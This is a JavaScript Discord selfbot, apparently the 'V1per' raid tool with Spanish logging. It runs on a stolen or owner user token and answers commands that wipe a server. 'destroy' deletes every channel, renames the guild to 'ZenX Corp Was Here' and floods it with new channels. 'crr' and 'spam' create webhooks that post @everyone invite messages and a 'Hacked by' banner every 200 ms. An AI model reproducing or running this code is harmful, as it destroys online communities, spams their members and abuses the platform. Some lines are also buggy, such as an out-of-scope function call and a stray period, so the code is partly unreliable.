const WebSocket = require('ws');
const socket = new WebSocket('wss://gateway.discord.gg/?v=10&encoding=json');
const prefix = ".";
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
const token = process.argv[2];
const user_ = process.argv[3];
let stop = false;
let user_id = "";
socket.on('open',()=>{
    console.log('Conectado al gateway.');
    socket.send(JSON.stringify({
        "op": 2,
        "d": {
            "token": token,
            "intents": 1 << 9,
            "properties": {
                "os": "linux",
                "browser": "my_library",
                "device": "my_library"
            }
        }
    }));
});
socket.on('message',(msg_buffer)=>{
    const msg = JSON.parse(msg_buffer.toString());
    if (msg.op === 0) {
        if (msg.t === "READY") {
            console.log(`Conectado con ${msg.d.user.username} - ${msg.d.user.id}`);
            user_id = msg.d.user.id;
            return;
        };
        if (msg.d && msg.d.author && msg.d.author.id === user_id) {
            try {
                if(msg.d.content.startsWith(prefix)){
                    const args = msg.d.content.slice(prefix.length).trim().split(/ +/);
                    const content = args.slice(1).join(' ');
                    const command = args.shift().toLowerCase();
                    if(command === "rename"){
                        comandos('rename', msg.d.guild_id, content);
                    };
                    if(command === "destroy"){
                        comandos('destroy', msg.d.guild_id);
                    };
                    if(command === "spam"){
                        comandos('spam', msg.d.guild_id, content);
                    };
                    if(command === "crr"){
                        comandos('crr', msg.d.guild_id);
                    };
                    if(command === "stop"){
                        comandos('stop', msg.d.guild_id);
                    };
                };
            } catch (error) {
                console.error('Error al mostrar el mensaje:', error);
            };
        };
    };
    if(msg.op === 10){
        console.log(`Mensaje de inicio recibido.`);
        const heartbeat_int = msg.d.heartbeat_interval;
        setInterval(() => {
            socket.send(JSON.stringify({op:1, d:null}));
        }, heartbeat_int);
    };
});
socket.on('error', (error) => {
    console.log(`error en la conexión`);
    console.log(error);
});

socket.on('close', (code, reason) => {
    console.log(`conexión cerrada`).
    console.log(code);
    console.log(reason);
});
async function comandos(comando, guild_id, content) {
    if(comando === "crr"){
        async function spam_webhook(id, token) {
            const wh_spam = setInterval(async () => {
                if(stop == true){
                    clearInterval(wh_spam);
                    return;
                };
                await fetch(`https://discord.com/api/v9/webhooks/${id}/${token}`,{
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body: JSON.stringify({
                        "username":"$ ZenX Corp",
                        "content":"> - ||@everyone||\n> ** https://discord.gg/zCQ8jQ2GBf **",
                    "avatar_url":"https://media.discordapp.net/attachments/1161131445268525116/1167799050087694366/iamgeraid3335.png?ex=6638ca1e&is=6637789e&hm=05b9b147d42dcb94541af6ee93b515faaf9e917e15c2a0ad9d141c7602982c06&=&format=webp&quality=lossless&width=460&height=418",
                        "embeds":[
                            {
                                "author":{
                                    "name": "V1per Replica",
                                    "icon_url": "https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128"
                                },
                                "title":`**Hacked by ${user_}**`,
                                "description":"```Using V1per | Free Selfbot v1.2```",
                                "image":{
                                                "url": "https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=66ad7850&is=66ac26d0&hm=ba383e324d14eb1e1bd9f9e19b20699ddc5564b547e09cf1633e1fd354bd982d&"
                                },
                                "footer": {
                            "text": "https://discord.gg/zCQ8jQ2GBf - $ ZenX$Team",
                            "icon_url": "https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128"
                          }
                            }
                        ]
                    })
                });
            }, 200);
        };
        async function crear_webhook(canalid) {
            const res = await fetch(`https://discord.com/api/v9/channels/${canalid}/webhooks`,{
                method:"POST",
                headers:{
                    "Authorization":token,
                    "Content-Type":"application/json"
                },
                body: JSON.stringify({
                    name:"ZenX-On-Top"
                })
            });
            const resJson = await res.json();
            if(res.status === 429){
                await wait_ms(resJson["retry_after"]);
                await crear_webhook(canalid);
            };
            spam_webhook(resJson["id"], resJson["token"]);
        };
        async function create_ch() {
            const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`,{
                method:"POST",
                headers:{
                    "Authorization":token,
                    "content-type":"application/json"
                },
                body:JSON.stringify({
                    "name":"zenx-on-top",
                    "type":0
                })
            });
            const resJson = await res.json();
            await crear_webhook(resJson["id"]);
            if(res.status === 429){
                await crear_webhook(resJson["id"]);
            };
        };
        for (let index = 0; index < 50; index++) {
            await create_ch();
            await wait_ms(250);
        };
    };
    if(comando === "stop"){
        stop = true;
        await wait_ms(3000);
        stop = false;
    };
    if(comando === "rename"){
        async function rename_channel(canalid) {
            try {
                const res = await fetch(`https://discord.com/api/v9/channels/${canalid}`,{
                    method:"PATCH",
                    headers:{
                        "Authorization":token,
                        "Content-Type":"application/json"
                    },
                    body: JSON.stringify({
                        name:content
                    })
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await wait_ms(resJson['retry_after']);
                    await rename_channel(canalid);
                };
            } catch (e) {
                console.log(e);
            }
        };
        async function get_channels() {
            try {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`, {
                    method:"GET",
                    headers:{
                        "Authorization":token
                    }
                });
                const resJson = await res.json();
                for (let index = 0; index < resJson.length; index++) {
                    await rename_channel(resJson[index]["id"]);
                };
            } catch (e) {
                console.log(e);
            }
        };
        get_channels();
    };
    if(comando === "destroy"){
        async function delete_channel(canalid) {
            try {
                const res = await fetch(`https://discord.com/api/v9/channels/${canalid}`,{
                    method:"DELETE",
                    headers:{
                        "Authorization":token,
                        "Content-Type":"application/json"
                    }
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await wait_ms(resJson['retry_after']);
                    await rename_channel(canalid);
                };
            } catch (e) {
                console.log(e)
            }
        };
        async function get_channels() {
            try {            
                const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`, {
                    method:"GET",
                    headers:{
                        "Authorization":token
                    }
                });
                const resJson = await res.json();
                for (let index = 0; index < resJson.length; index++) {
                    await delete_channel(resJson[index]["id"]);
                };
            } catch (e) {
                console.log(e);
            };
        };
        await get_channels();
        async function guild_changes(){
            async function guild_name() {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}`,{
                    method:"PATCH",
                    headers:{
                        "Authorization":token,
                        "Content-Type":"application/json"
                    },
                    body: JSON.stringify({
                        "name":"$ ZenX Corp Was Here",
                    })
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await wait_ms(resJson["retry_after"]);
                    await guild_changes();
                };
            };
            async function guild_icon() {
                try {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}`,{
                        method:"PATCH",
                        headers:{
                            "Authorization":token,
                            "Content-Type":"application/json"
                        },
                        body:JSON.stringify({
                            icon:"https://cdn.discordapp.com/attachments/1172295274379612210/1268442072151490590/logo-zenx.jpg?ex=66ac703c&is=66ab1ebc&hm=c30d5c997af5580e99aaf3006a5b4957d44d95d70a3b11fe9e29c78300e04620&"
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        await wait_ms(resJson["retry_after"]);
                        await guild_changes();
                    };
                } catch (e) {
                    console.log(e);
                };
            };
            await guild_name();
            await guild_icon();
        };
        await guild_changes();
        async function create_channels() {
            async function create_text_channel(canalpadre) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`,{
                        method:"POST",
                        headers:{
                            "Authorization":token,
                            "Content-type":"application/json"
                        },
                        body:JSON.stringify({
                            "name":"zenx-corp",
                            "type":0,
                            "parent_id":`${canalpadre}`
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 429){
                        await wait_ms(resJson["retry_after"]);
                        await create_text_channel(canalpadre);
                    };
                } catch (e) {
                    console.log(e);
                }
            };
            async function create_cattegory_channel() {
                try {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`,{
                        method:"POST",
                        headers:{
                            "Authorization":token,
                            "Content-type":"application/json"
                        },
                        body:JSON.stringify({
                            "name":"zenx corp",
                            "type":4
                        })
                    });
                    const resJson = await res.json();
                    console.log(res.status);
                    console.log(resJson);
                    if(res.status === 429){
                        await wait_ms(200);
                        for (let index = 0; index < 4; index++) {
                            await create_text_channel(resJson['id']);
                        };
                    };
                    for (let index = 0; index < 4; index++) {
                        await create_text_channel(resJson['id']);
                        await wait_ms(200);
                    };
                } catch (e) {
                    console.log(e);
                };
            };
            for (let index = 0; index < 4; index++) {
                await create_cattegory_channel();
                await wait_ms(250);
            };
        };
        await create_channels();
    };
    if(comando === "spam"){
        async function spam_webhook(id, token) {
            const wh_spam = setInterval(async () => {
                if(stop == true){
                    clearInterval(wh_spam);
                    return;
                };
                try {
                    await fetch(`https://discord.com/api/v9/webhooks/${id}/${token}`,{
                        method:"POST",
                        headers:{
                            "Content-Type":"application/json"
                        },
                        body: JSON.stringify({
                            "username":"$ ZenX Corp",
                            "content":"> - ||@everyone||\n> ** https://discord.gg/zCQ8jQ2GBf **",
                        "avatar_url":"https://media.discordapp.net/attachments/1161131445268525116/1167799050087694366/iamgeraid3335.png?ex=6638ca1e&is=6637789e&hm=05b9b147d42dcb94541af6ee93b515faaf9e917e15c2a0ad9d141c7602982c06&=&format=webp&quality=lossless&width=460&height=418",
                            "embeds":[
                                {
                                    "author":{
                                        "name": "V1per Replica",
                                        "icon_url": "https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128"
                                    },
                                    "title":`**Hacked by ${user_}**`,
                                    "description":"```Using V1per | Free Selfbot v1.2```",
                                    "image":{
                                                    "url": "https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=66ad7850&is=66ac26d0&hm=ba383e324d14eb1e1bd9f9e19b20699ddc5564b547e09cf1633e1fd354bd982d&"
                                    },
                                    "footer": {
                                "text": "https://discord.gg/zCQ8jQ2GBf - $ ZenX$Team",
                                "icon_url": "https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128"
                              }
                                }
                            ]
                        })
                    });   
                } catch (e) {
                    console.log(e);
                };
            }, 200);
        };
        async function crear_webhook(canalid) {
            try {
                const res = await fetch(`https://discord.com/api/v9/channels/${canalid}/webhooks`,{
                    method:"POST",
                    headers:{
                        "Authorization":token,
                        "Content-Type":"application/json"
                    },
                    body: JSON.stringify({
                        name:"ZenX-On-Top"
                    })
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await crear_webhook(canalid);
                };
                spam_webhook(resJson["id"], resJson["token"]);
            } catch (e) {
                console.log(e)
            }
        };
        async function get_channels() {
            try {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guild_id}/channels`,{
                    method:"GET",
                    headers:{
                        "Authorization":token
                    }
                });
                const resJson = await res.json();
                for (let index = 0; index < resJson.length; index++) {
                    if(resJson[index]["type"] === 0){
                        await crear_webhook(resJson[index]["id"]);
                    };
                };   
            } catch (e) {
                console.log(e)
            }
        };
        get_channels();
    };
};